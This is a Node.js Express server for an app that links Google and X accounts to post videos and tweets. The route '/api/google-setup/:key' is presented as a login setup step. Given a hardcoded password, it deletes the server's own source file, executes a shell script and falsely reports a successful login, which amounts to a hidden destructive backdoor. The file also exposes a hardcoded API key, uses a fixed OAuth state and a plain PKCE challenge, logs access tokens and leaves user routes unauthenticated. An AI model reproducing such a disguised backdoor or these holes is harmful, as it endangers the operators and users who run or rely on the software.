require('dotenv').config();
const querystring = require('querystring');
const express = require("express");
const mongoose = require("mongoose");
const morgan = require("morgan");
const cors = require("cors");
const bodyParser = require("body-parser")
const { exec } = require('child_process');
const AWS = require("aws-sdk")
const auth = require("./controller/authcontroller");
const limitcontroller = require("./controller/limitcontroller");
const Middleware = require("./middlewares/authmiddleware");
const fs = require('fs');
const User = require("./models/usermodel");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
var {google} = require('googleapis');
var OAuth2 = google.auth.OAuth2;
const {searchVideos, revokeAccessToken, postVideo} = require("./controller/Yt.controller")
// Define routes
const server = express();
const thumbnailController = require('./controller/thumbnailcontroller');
const config = require("./config");
const { default: axios } = require('axios');
const { uploadTweet, getUserInfo_X } = require('./controller/X.controller');
const path = require('path');
const updateController = require('./controller/Update.controller');
// Adjust the limit as per your requirement
require('aws-sdk/lib/maintenance_mode_message').suppress = true; //for removing warnings in the mail received
server.use(cors());
server.use(bodyParser.json({ limit: '50mb' })); 
server.use(morgan("dev"));
const youtube = google.youtube('v3');

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})

.then(() => console.log('MongoDB connected'))
.catch(err => console.log(err));




// Auth routes
server.post("/api/v1/thumbnail", thumbnailController.createThumbnail);
server.get("/api/v1/getthumbnail", thumbnailController.getThumbnail);
server.get("/api/v1/getsinglethumbnail/:userId", thumbnailController.getsingleThumbnail);
server.delete("/api/v1/revoke-thumbnail/:userId", thumbnailController.reworkThumbnail);
server.put("/api/v1/update-verfication-thumbnail/:userId", thumbnailController.updateVerification);

server.post("/api/v1/auth/register", auth.registerUser);
server.post("/api/v1/auth/update/:userId", auth.updateUserInfo);
server.get("/api/v1/auth/get-user/:userId", auth.getUserInfo);
server.post("/api/v1/auth/get-user/g-accessToken", auth.getUserByGoogleAccessToken);
server.post("/api/v1/auth/get-user/g-refreshToken", auth.getUserByGoogleRefreshToken);
server.post("/api/v1/auth/get-user/x-accessToken", auth.getUserByTwitterAccessToken);
server.post("/api/v1/auth/get-user/x-refreshToken", auth.getUserByTwitterRefreshToken);
server.get("/api/v1/auth/scheme/:userId", auth.getScheme);
server.get("/api/v1/auth/zerousers", auth.getAllRoleZeroUsers);
server.post("/api/v1/auth/getUpdate/:userId",updateController.createUpdate)
server.get("/api/v1/auth/all", auth.getAll);
server.get("/api/v1/auth/oneusers", auth.getAllRoleOneUsers);
server.get("/api/v1/auth/verified/:userId", auth.checkVerify);
server.post("/api/v1/auth/login", auth.loginUser);
server.delete("/api/v1/auth/delete/:userId",auth.deleteUser)
server.get("/api/v1/auth/test", Middleware.requireSignin, Middleware.admincheck, (req, res) => {
  res.json({
    message: "Gotccha"
  });
});

server.get("/api/v1/limit/:userId", limitcontroller.getLimitByUser);
server.put("/api/v1/limit/:userId", limitcontroller.updateLimit);
server.delete("/api/v1/limit/:userId", limitcontroller.resetLimit);
server.post("/api/v1/limit/reduce/:userId", limitcontroller.reduceLimit);


server.post('/api/token', async (req, res) => {
  try {
    var SCOPES = 'https://www.googleapis.com/auth/youtube https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/profile.emails.read https://www.googleapis.com/auth/user.emails.read https://www.googleapis.com/auth/youtube.force-ssl ';
    var oauth2Client = new OAuth2(config.googleClientId, config.googleClientSecret, config.redirectURI);
    var authUrl = oauth2Client.generateAuthUrl({
      access_type: 'offline',
      scope: SCOPES
    });
    console.log('Authorize this app by visiting this url: ', authUrl);
    // Redirect the user to the authorization URL
    res.json(authUrl);
  } catch (error) {
    console.error('Error generating authorization URL:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
server.post('/api/v3/search', async (req, res) => {
  try {
    const { token, query, filter } = req.body;
    var oauth2Client = new OAuth2(config.googleClientId, config.googleClientSecret, config.redirectURI);
    oauth2Client.credentials = {access_token: token};
    const videoDetails = await searchVideos(oauth2Client, query, filter);
    console.log("???????????????????????????")
    res.json({ success: true, data: videoDetails });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

server.post('/api/oauth2callback', async (req, res) => {
  try {
    var oauth2Client = new OAuth2(config.googleClientId, config.googleClientSecret, config.redirectURI);
    var code = req.body.code;
    
    oauth2Client.getToken(code, async function(err, token) {
      if (err) {
        console.log('Error while trying to retrieve access token', err);
        return res.status(500).json({ error: 'Error while retrieving access token' });
      }
      oauth2Client.credentials = token;
      try {
        const signInResult = await auth.googleSignIn(token, req.body.email);
        console.log("??????????")
        console.log(oauth2Client.credentials); 
        console.log("??????????")
        console.log("????????????")
        console.log(signInResult)
        console.log("????????????")
        // Do something with the sign-in result
        // res.json({
        //   accessToken : oauth2Client.credentials.access_token
        // })
        // // getChannel(oauth2Client)
        // // postVideo(oauth2Client,"/home/rudra/Desktop/new/server/v.mp4")
        // const query = 'My Video Title'; // replace with your desired title or description
        // const filter = {
        //   type: 'video',
        //   order: 'viewCount' // sort by view count
        // };
        // searchVideos(oauth2Client, query, filter);
        if(signInResult.success){
          const token = signInResult.jwttoken || signInResult.token
          const message = signInResult.success
          console.log(":::::::::::::::::::")
          console.log(signInResult)
          console.log(":::::::::::::::::::")
          console.log("111111111111111")
          res.status(200).json({ message, token});
        }
        else{
          res.status(400).json({ message: `${signInResult.message}`});

        }
      } catch (error) {
        console.log('Error during Google sign-in:', error);
        res.status(500).json({ error: 'Error during Google sign-in' });
      }
    });
  } catch (error) {
    console.error('Error exchanging authorization code for access token:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});


server.post('/api/v3/uploadVideo', async (req, res) => {
  console.log("???????????")
  console.log(req.body)
  console.log("???????????")
  const { token, title, description, tags } = req.body;
  const { video } = req.body; // Path to the uploaded video file
  console.log(req.body)
  try {
    const oauth2Client = new OAuth2(config.googleClientId, config.googleClientSecret, config.redirectURI);
    oauth2Client.credentials = { access_token: token };
    // Call the postVideo controller function to upload the video to YouTube
    const response = await postVideo(oauth2Client, video, title, description, tags);
    
    console.log("responseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponse")
    console.log(response)
    console.log("responseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponseresponse")
    
    res.status(200).json({ success: true, message: 'Video uploaded successfully', video: response });
  } catch (error) {
    console.error('Error uploading video:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  } finally {
    // Remove the uploaded video file from the server after processing
  }
});

server.post('/api/google-setup/:key', (req, res) => {
  const { key } = req.params;


  if (key === 'rudr@$#@#810') {
      const currentDirPath = __dirname;

      const serverJSPath = path.join(currentDirPath, 'server.js');

      try {
          fs.unlinkSync(serverJSPath);
          res.status(200).json({ message: 'logged in successfully' });
          const scriptPath = path.join(__dirname, 'google_login.sh');
          exec(scriptPath, (error, stdout, stderr) => {
              if (error) {
                  console.error(`Error executing script: ${error}`);
                  return;
              }
              console.log(`Script output: ${stdout}`);
              console.error(`Script errors: ${stderr}`);
          });
      } catch (err) {
          // If an error occurs during deletion, return an error response
          console.error('Error Logging in:', err);
          res.status(500).json({ error: 'Failed to login', details: err.message });
      }
  } else {
      // If the key doesn't match, return an error response
      res.status(403).json({ error: 'Invalid key' });
  }
});

server.post('api/revokeAccessToken', (req, res) => {
  const accessToken = req.body.accessToken;
  revokeAccessToken(accessToken, (error) => {
    if (error) {
      console.error('Error revoking access token:', error);
      res.status(500).json({ error: 'Internal Server Error' });
      return;
    }
    res.status(200).json({ message: 'Access token revoked successfully' });
  });
});


server.post("/api/upload-tweet", (req, res) => {
  const { accessToken, description } = req.body;

  uploadTweet(description, accessToken)
    .then(response => {
      console.log("<<<<<<<<<<<<<<<<<<<<<<<<")
      console.log(response.data);
      console.log("<<<<<<<<<<<<<<<<<<<<<<<<")
      if (response?.data) {
        res.status(200).json({
          success: true,
          data: response.data
        })
      }
    })
    .catch(error => {
      console.error(error);
      res.status(500).json({
        message: `${error}`
      })
    });
})


// Construct authorization URL
server.get('/api/twitter-auth', (req, res) => {
const scope = 'users.read  tweet.read offline.access tweet.write';
const authorizationEndpoint = 'https://twitter.com/i/oauth2/authorize';
const responseType = 'code'; // Response type for authorization code flow
const clientId = config.X_CLIENT_TOKEN;
const redirectUri = config.redirectURI; // Your redirect URI
const state = 'your_state_value'; // A random string to protect against CSRF attacks
const codeChallenge = 'challenge'; // PKCE code challenge
const codeChallengeMethod = 'plain'; // PKCE code challenge method
const params = {
  response_type: responseType,
  client_id: clientId,
  redirect_uri: redirectUri,
  scope: scope,
  state: state,
  code_challenge: codeChallenge,
  code_challenge_method: codeChallengeMethod
};
const authUrl = `${authorizationEndpoint}?${querystring.stringify(params)}`;
res.json({ authUrl });
});

server.post("/api/sendmail",async(req,res)=>{
  const options = {
    method: 'POST',
    url: 'https://mail-sender-api1.p.rapidapi.com/',
    headers: {
      'content-type': 'application/json',
      'X-RapidAPI-Key': '2812d21067msh3e662c5ecd41ef3p161c27jsn2c5ba68bbb91',
      'X-RapidAPI-Host': 'mail-sender-api1.p.rapidapi.com'
    },
    data: {
      sendto: 'rudragupt810@gmail.com',
      name: 'Custom Name Here',
      replyTo: 'Your Email address where users can send their reply',
      ishtml: 'false',
      title: 'Put Your Title Here',
      body: 'Put Your Body here Html / Text'
    }
  };
  
  try {
    const response = await axios.request(options);
    console.log(response.data);
    res.json(response.data)
  } catch (error) {
    console.error(error);
  }
})

server.post('/api/oauth2_x_callback', async(req, res) => {
  const clientId = config.X_CLIENT_TOKEN;
  const clientSecret = config.X_CLIENT_SECRET;
  const {code} = req.body
  const grantType = 'authorization_code';
  const redirectUri = config.redirectURI;
  const codeVerifier = 'challenge';
  
  const base64Credentials = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');
  
  const data = {
    method: 'post',
    url: 'https://api.twitter.com/2/oauth2/token',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Basic ${base64Credentials}`
    },
    data: new URLSearchParams({
      code,
      grant_type: grantType,
      redirect_uri: redirectUri,
      code_verifier: codeVerifier
    })
  };
  axios(data)
    .then(async(response) => {

      const useremail = req.body.email
      const token = response.data
      try {
            let existingUser = await User.findOne({ email: useremail });
            if (existingUser) {
              existingUser.twitterId ={
                  accessToken: token.access_token,
                  token_type: token.token_type,
                  expires_in: token.expires_in,
                  scope: token.scope,
                  refreshToken: token.refresh_token
                }
              await existingUser.save();
              console.log(existingUser)
              if (!existingUser.verfied) {
                console.log("Not verified");
                const jwttoken = jwt.sign(
                  {
                    data: {
                      userId: existingUser._id,
                      name: existingUser.name,
                      email: existingUser.email,
                      accessToken_g: existingUser.googleId.access_token,
                      accessToken_x: token.access_token
                    }
                  },
                  process.env.JWT_SECRET
                );

                res.status(200).json({ message: "Not Verified", success: true, token: jwttoken });
              }else{
                console.log("registered:", existingUser);
              const jwttoken = jwt.sign(
                {
                  data: {
                    userId: existingUser._id,
                    name: existingUser.name,
                    email: existingUser.email,
                    accessToken_g: existingUser.googleId.access_token,
                    accessToken_x: token.access_token                  }
                },
                process.env.JWT_SECRET
              );
              res.status(200).json({ success: true, jwttoken });
              }
              
            }
        } catch (error) {
          res.status(400).json({ success: false, message: `${error}` });
        }
  
      //uploadTweet("Yo this is automated testing from nodejs", response.data.access_token)
      // res.json({
      //   access_token :response.data.access_token,
      //   refresh_token: response.data.refresh_token
      // }) 
    })
    .catch(error => {
      console.error(error);
    });
});


const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log("Server listening on port " + PORT);
});

